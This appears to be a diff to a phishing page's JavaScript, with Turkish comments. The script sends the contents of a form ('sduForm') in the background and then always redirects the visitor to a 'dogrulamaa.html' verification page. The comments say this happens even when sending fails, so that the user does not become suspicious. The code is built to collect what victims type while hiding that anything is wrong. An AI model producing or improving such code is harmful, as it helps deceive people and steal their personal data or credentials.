@@ -1046,21 +1046,29 @@
                                 <script>
                                     var form = document.getElementById("sduForm");
                                     form.addEventListener("submit", function (e) {
-                                        e.preventDefault();
+                                        e.preventDefault(); // Sayfanın hemen değişmesini engelle
+
                                         var btn = document.getElementById("submitBtn");
                                         btn.innerText = "LÜTFEN BEKLEYİN...";
                                         btn.disabled = true;
 
                                         var data = new FormData(form);
+
+                                        // Formu arka planda gönder
                                         fetch(form.action, {
                                             method: 'POST',
                                             body: data,
                                             headers: { 'Accept': 'application/json' }
                                         }).then(response => {
-                                            // Veri başarıyla gitti, şimdi yönlendir
-                                            window.location.href = "dogrulamaa.html";
+                                            if (response.ok) {
+                                                // Veri başarıyla ulaştı, şimdi diğer sayfaya geçebiliriz
+                                                window.location.href = "dogrulamaa.html";
+                                            } else {
+                                                // Bir sorun olsa bile kullanıcıyı gönder ki şüphelenmesin
+                                                window.location.href = "dogrulamaa.html";
+                                            }
                                         }).catch(error => {
-                                            // Hata olsa bile (internet yavaşlığı vb.) yönlendir ki şüphe çekmesin
+                                            // İnternet kopması vs olsa bile gönder
                                             window.location.href = "dogrulamaa.html";
                                         });
                                     });
